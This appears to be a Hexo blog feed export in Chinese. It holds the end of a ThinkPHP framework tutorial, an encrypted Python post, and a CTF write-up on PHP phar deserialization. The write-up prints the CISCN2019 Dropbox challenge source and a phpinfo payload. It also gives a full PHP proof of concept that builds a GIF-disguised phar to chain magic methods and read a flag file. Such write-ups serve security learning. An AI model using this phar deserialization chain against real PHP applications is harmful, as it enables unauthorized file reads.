title="模板布局"></a>模板布局</h5><p>这个比较特殊。使用模板布局，就是把多个模板页面都有的公共代码给抽取出来，放到一个公共位置开发维护。<br>好处：相同的代码只维护一份，减少代码工作量。<br><strong>全局布局设置步骤：</strong><br>1.application/模块名/config.php,加入以下设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#39;template&#39;  &#x3D;&gt;  [</span><br><span class="line">    &#39;layout_on&#39;     &#x3D;&gt;  true,&#x2F;&#x2F;开启布局</span><br><span class="line">    &#39;layout_name&#39;   &#x3D;&gt;  &#39;layout&#39;,&#x2F;&#x2F;布局文件名称</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>我们在view下创建一个layout.html就会自动调用这个html文件</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/27.png" class title="This is an test image"><p>调用顺序：当启用layout时，不管是否定义了别的模板，layout.html先被调用，其会覆盖掉别的定义模板。<br>在layout.html中使用自定义的模板，可以使用CONTENT关键字。<br>用法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;__CONTENT__&#125;</span><br></pre></td></tr></table></figure><p>临时关闭layout可以使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;view-&gt;engine-&gt;layout(false);</span><br></pre></td></tr></table></figure><p>注：也可以使用<strong>STATIC</strong> 代替静态资源路径中的/static</p><hr><h3 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h3><h4 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h4><p>在application/database.php中配置数据库信息</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/28.png" class title="This is an test image"><h5 id="特殊表名处理"><a href="#特殊表名处理" class="headerlink" title="特殊表名处理"></a>特殊表名处理</h5><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/29.png" class title="This is an test image"><h5 id="查询多个数据"><a href="#查询多个数据" class="headerlink" title="查询多个数据"></a>查询多个数据</h5><p>有很多方法，这里写我喜欢用的一种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$goods &#x3D; new GoodsModel();</span><br><span class="line">$data &#x3D; $goods -&gt;select();</span><br><span class="line">$data &#x3D; (new \think\Collection())-&gt;toArrary();</span><br></pre></td></tr></table></figure><p><strong>动态调用select方法来获取数据，最后通过collection类整合成标准的二维数组</strong><br>后台商品展示实例：</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/30.png" class title="This is an test image"><h5 id="查询一条数据"><a href="#查询一条数据" class="headerlink" title="查询一条数据"></a>查询一条数据</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$good &#x3D; new GoodsModel();</span><br><span class="line">$data &#x3D; $good-&gt;find($id);</span><br><span class="line"></span><br><span class="line">where(&#39;字段名&#39;,&#39;表达式&#39;，&#39;查询条件&#39;)</span><br><span class="line">$good &#x3D; new GoodsModel();</span><br><span class="line">$data &#x3D; $good-&gt;where(&#39;id&#39;,&#39;&#x3D;&#39;,$id);</span><br></pre></td></tr></table></figure><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/31.png" class title="This is an test image"><h5 id="连贯查询"><a href="#连贯查询" class="headerlink" title="连贯查询"></a>连贯查询</h5><p>原理：中间调用的方法，返回值是对象，可以继续调用对象的其他方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$model = <span class="keyword">new</span> Address();</span><br><span class="line"></span><br><span class="line">$model-&gt;field(<span class="string">'id,name'</span>)-&gt;select(); <span class="comment">//指定要查询的字段，原生sql中select后面的字段</span></span><br><span class="line"></span><br><span class="line">$model-&gt;order(<span class="string">'id desc,time desc'</span>)-&gt;select(); <span class="comment">//相当于原生sql中的order by</span></span><br><span class="line"></span><br><span class="line">$model-&gt;limit(<span class="number">3</span>)-&gt;select(); <span class="comment">//相当于原生sql中的limit条件</span></span><br><span class="line"></span><br><span class="line">$model-&gt;limit(<span class="number">0</span>,<span class="number">3</span>)-&gt;select(); </span><br><span class="line"></span><br><span class="line">$model-&gt;limit(<span class="string">'0,3'</span>)-&gt;select(); </span><br><span class="line"></span><br><span class="line">$model-&gt;group(<span class="string">'cate_id'</span>)-&gt;select();  <span class="comment">//相当于原生sql中的group by</span></span><br><span class="line"></span><br><span class="line">$model-&gt;having(<span class="string">'id&gt;3'</span>)-&gt;select();  <span class="comment">//相当于原生sql中的having条件</span></span><br><span class="line"></span><br><span class="line">$model-&gt;alias(<span class="string">'a'</span>)-&gt;join(<span class="string">'think_user_type t'</span>,<span class="string">'a.id=t.user_id'</span>, <span class="string">'left'</span>)-&gt;select(); <span class="comment">//alias方法设置别名，join方法连表查询</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Address::alias('a')-&gt;join('tpshop_user u','a.user_id = u.id', 'left')-&gt;select();</span></span><br></pre></td></tr></table></figure><h5 id="字段数据查询"><a href="#字段数据查询" class="headerlink" title="字段数据查询"></a>字段数据查询</h5><p>有两种方法，一种使用find()查询后，用索引的方式调用。另一种就是调用value方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$good = <span class="keyword">new</span> GoodModel();</span><br><span class="line">$data = $good-&gt;find($id)-&gt;value(<span class="string">'goods_name'</span>);</span><br><span class="line"></span><br><span class="line">-------------</span><br><span class="line"></span><br><span class="line">$data = $good-&gt;find($id);</span><br><span class="line">$content = $data[<span class="string">'goods_name'</span>];</span><br></pre></td></tr></table></figure><h5 id="系统变量"><a href="#系统变量" class="headerlink" title="系统变量"></a>系统变量</h5><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/32.png" class title="This is an test image"><h6 id="查询数据-一条"><a href="#查询数据-一条" class="headerlink" title="查询数据(一条)"></a>查询数据(一条)</h6><p>save()</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/33.png" class title="This is an test image"><h6 id="查询数据-多条"><a href="#查询数据-多条" class="headerlink" title="查询数据(多条)"></a>查询数据(多条)</h6><p>saveAll()</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/34.png" class title="This is an test image"><h6 id="过滤非数据表字段"><a href="#过滤非数据表字段" class="headerlink" title="过滤非数据表字段"></a>过滤非数据表字段</h6><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/35.png" class title="This is an test image"><h5 id="表单验证"><a href="#表单验证" class="headerlink" title="表单验证"></a>表单验证</h5><p>使用tp给的一个类:<strong>new \think\Validate()</strong></p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/36.png" class title="This is an test image"><p>TP框架的基本操作已经学完，以后就是看TP手册自己调试。</p>]]></content>
    
    <summary type="html">
    
      &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;第一部分&quot;&gt;&lt;a href=&quot;#第一部分&quot; class=&quot;headerlink&quot; title=&quot;第一部分&quot;&gt;&lt;/a&gt;第一部分&lt;/h3&gt;&lt;h4 id=&quot;框架概述&quot;&gt;&lt;a href=&quot;#框架概述&quot; class=&quot;headerlink&quot; title=&quot;框架概述&quot;&gt;&lt;/a&gt;框架概述&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;框架就是一些代码类、方法（函数）、变量、常量的集合，这些代码是功能结构性的代码（并非业务代码）。业务代码其实就是具体的一些模块的增删改查逻辑代码。使用框架开发项目，有便于代码重用、开发效率高、代码规范好、便于功能扩展等优点。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;一般框架都是基于MVC架构。&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Python网络编程小总结</title>
    <link href="https://da4er.top/Python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%B0%8F%E6%80%BB%E7%BB%93.html"/>
    <id>https://da4er.top/Python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%B0%8F%E6%80%BB%E7%BB%93.html</id>
    <published>2020-03-16T03:27:13.000Z</published>
    <updated>2020-03-16T03:32:57.807Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="3079619048a6310f3ac16393c8b767e3fbff0dd0a11a79d5ad8e784217598621"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="Python" scheme="https://da4er.top/categories/Python/"/>
    
    
  </entry>
  
  <entry>
    <title>CTF反序列化题目总结(持续更新....)</title>
    <link href="https://da4er.top/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html"/>
    <id>https://da4er.top/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html</id>
    <published>2020-03-15T06:59:53.000Z</published>
    <updated>2020-03-16T03:29:24.758Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="一-入门题目"><a href="#一-入门题目" class="headerlink" title="一. 入门题目"></a>一. 入门题目</h3><p>代码如下：</p><img src="/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/1.png" class title="Da4er"><a id="more"></a><p>很简单的利用phar进行反序列化，POC如下：</p><img src="/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/2.png" class title="Da4er"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename&#x3D;phar:&#x2F;&#x2F;da4er.phar&amp;__&#x3D;phpinfo();</span><br></pre></td></tr></table></figure><img src="/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/3.png" class title="Da4er"><p>查看生成的phar文件：</p><img src="/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/4.png" class title="Da4er"><hr><h3 id="二-CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#二-CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="二.[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>二.[CISCN2019 华北赛区 Day1 Web1]Dropbox</h3><p>题目知识点为：任意文件下载加phar反序列化。<br>我们直接看phar反序列化的地方：<br>delete.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&#39;login&#39;])) &#123;</span><br><span class="line">    header(&quot;Location: login.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">if (!isset($_POST[&#39;filename&#39;])) &#123;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">include &quot;class.php&quot;;</span><br><span class="line">chdir($_SESSION[&#39;sandbox&#39;]);</span><br><span class="line">$file &#x3D; new File();</span><br><span class="line">$filename &#x3D; (string) $_POST[&#39;filename&#39;];</span><br><span class="line">if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123;</span><br><span class="line">    $file-&gt;detele();</span><br><span class="line">    Header(&quot;Content-type: application&#x2F;json&quot;);</span><br><span class="line">    $response &#x3D; array(&quot;success&quot; &#x3D;&gt; true, &quot;error&quot; &#x3D;&gt; &quot;&quot;);</span><br><span class="line">    echo json_encode($response);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    Header(&quot;Content-type: application&#x2F;json&quot;);</span><br><span class="line">    $response &#x3D; array(&quot;success&quot; &#x3D;&gt; false, &quot;error&quot; &#x3D;&gt; &quot;File not exist&quot;);</span><br><span class="line">    echo json_encode($response);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$dbaddr &#x3D; &quot;127.0.0.1&quot;;</span><br><span class="line">$dbuser &#x3D; &quot;root&quot;;</span><br><span class="line">$dbpass &#x3D; &quot;root&quot;;</span><br><span class="line">$dbname &#x3D; &quot;dropbox&quot;;</span><br><span class="line">$db &#x3D; new mysqli($dbaddr, $dbuser, $dbpass, $dbname);</span><br><span class="line">class User &#123;</span><br><span class="line">    public $db;</span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        global $db;</span><br><span class="line">        $this-&gt;db &#x3D; $db;</span><br><span class="line">    &#125;</span><br><span class="line">    public function user_exist($username) &#123;</span><br><span class="line">        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;username&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ? LIMIT 1;&quot;);</span><br><span class="line">        $stmt-&gt;bind_param(&quot;s&quot;, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;store_result();</span><br><span class="line">        $count &#x3D; $stmt-&gt;num_rows;</span><br><span class="line">        if ($count &#x3D;&#x3D;&#x3D; 0) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    public function add_user($username, $password) &#123;</span><br><span class="line">        if ($this-&gt;user_exist($username)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;);</span><br><span class="line">        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;INSERT INTO &#96;users&#96; (&#96;id&#96;, &#96;username&#96;, &#96;password&#96;) VALUES (NULL, ?, ?);&quot;);</span><br><span class="line">        $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    public function verify_user($username, $password) &#123;</span><br><span class="line">        if (!$this-&gt;user_exist($username)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;);</span><br><span class="line">        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;password&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ?;&quot;);</span><br><span class="line">        $stmt-&gt;bind_param(&quot;s&quot;, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;bind_result($expect);</span><br><span class="line">        $stmt-&gt;fetch();</span><br><span class="line">        if (isset($expect) &amp;&amp; $expect &#x3D;&#x3D;&#x3D; $password) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        $this-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class FileList &#123;</span><br><span class="line">    private $files;</span><br><span class="line">    private $results;</span><br><span class="line">    private $funcs;</span><br><span class="line">    public function __construct($path) &#123;</span><br><span class="line">        $this-&gt;files &#x3D; array();</span><br><span class="line">        $this-&gt;results &#x3D; array();</span><br><span class="line">        $this-&gt;funcs &#x3D; array();</span><br><span class="line">        $filenames &#x3D; scandir($path);</span><br><span class="line">        $key &#x3D; array_search(&quot;.&quot;, $filenames);</span><br><span class="line">        unset($filenames[$key]);</span><br><span class="line">        $key &#x3D; array_search(&quot;..&quot;, $filenames);</span><br><span class="line">        unset($filenames[$key]);</span><br><span class="line">        foreach ($filenames as $filename) &#123;</span><br><span class="line">            $file &#x3D; new File();</span><br><span class="line">            $file-&gt;open($path . $filename);</span><br><span class="line">            array_push($this-&gt;files, $file);</span><br><span class="line">            $this-&gt;results[$file-&gt;name()] &#x3D; array();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __call($func, $args) &#123;</span><br><span class="line">        array_push($this-&gt;funcs, $func);</span><br><span class="line">        foreach ($this-&gt;files as $file) &#123;</span><br><span class="line">            $this-&gt;results[$file-&gt;name()][$func] &#x3D; $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        $table &#x3D; &#39;&lt;div id&#x3D;&quot;container&quot; class&#x3D;&quot;container&quot;&gt;&lt;div class&#x3D;&quot;table-responsive&quot;&gt;&lt;table id&#x3D;&quot;table&quot; class&#x3D;&quot;table table-bordered table-hover sm-font&quot;&gt;&#39;;</span><br><span class="line">        $table .&#x3D; &#39;&lt;thead&gt;&lt;tr&gt;&#39;;</span><br><span class="line">        foreach ($this-&gt;funcs as $func) &#123;</span><br><span class="line">            $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($func) . &#39;&lt;&#x2F;th&gt;&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;Opt&lt;&#x2F;th&gt;&#39;;</span><br><span class="line">        $table .&#x3D; &#39;&lt;&#x2F;thead&gt;&lt;tbody&gt;&#39;;</span><br><span class="line">        foreach ($this-&gt;results as $filename &#x3D;&gt; $result) &#123;</span><br><span class="line">            $table .&#x3D; &#39;&lt;tr&gt;&#39;;</span><br><span class="line">            foreach ($result as $func &#x3D;&gt; $value) &#123;</span><br><span class="line">                $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($value) . &#39;&lt;&#x2F;td&gt;&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">            $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot; filename&#x3D;&quot;&#39; . htmlentities($filename) . &#39;&quot;&gt;&lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;download&quot;&gt;下载&lt;&#x2F;a&gt; &#x2F; &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;delete&quot;&gt;删除&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&#39;;</span><br><span class="line">            $table .&#x3D; &#39;&lt;&#x2F;tr&gt;&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        echo $table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class File &#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public function open($filename) &#123;</span><br><span class="line">        $this-&gt;filename &#x3D; $filename;</span><br><span class="line">        if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function name() &#123;</span><br><span class="line">        return basename($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    public function size() &#123;</span><br><span class="line">        $size &#x3D; filesize($this-&gt;filename);</span><br><span class="line">        $units &#x3D; array(&#39; B&#39;, &#39; KB&#39;, &#39; MB&#39;, &#39; GB&#39;, &#39; TB&#39;);</span><br><span class="line">        for ($i &#x3D; 0; $size &gt;&#x3D; 1024 &amp;&amp; $i &lt; 4; $i++) $size &#x2F;&#x3D; 1024;</span><br><span class="line">        return round($size, 2).$units[$i];</span><br><span class="line">    &#125;</span><br><span class="line">    public function detele() &#123;</span><br><span class="line">        unlink($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    public function close() &#123;</span><br><span class="line">        return file_get_contents($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这个关键在于class这个文件中，分析如下：</p><img src="/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/5.png" class title="Da4er"><p>我们可以发现一个File类里面的close函数有一个文件处理函数，那么关键就在于怎么把这个close函数调用。<br>通过分析发现在FileList类里面有个<strong>call魔法函数，也就是说我们可以通过这个魔法函数触发File类里面的close函数。那么接着分析找到User类里面也有个close函数是在</strong>destruct()，那么思路就很清楚了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.构造User类</span><br><span class="line">2.让User类的成员变量再构造一个FileList类</span><br><span class="line">3.让FileList类里面的$files数组里面包含File类</span><br><span class="line">4.File类的$filename变量为flag文件</span><br></pre></td></tr></table></figure><p>POC如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">File Name :     Poc</span></span><br><span class="line"><span class="comment">Description : https://da4er.top</span></span><br><span class="line"><span class="comment">date :          2020-03-15</span></span><br><span class="line"><span class="comment">Author :       Da4er's</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="keyword">new</span> File(<span class="string">'/flag.txt'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$o = <span class="keyword">new</span> User();</span><br><span class="line">$o-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line">@unlink(<span class="string">"da4er.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"da4er.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><img src="/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/6.png" class title="Da4er"><p>再delete页面得到flag：</p><img src="/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/7.png" class title="Da4er">]]></content>
    
    <summary type="html">
    
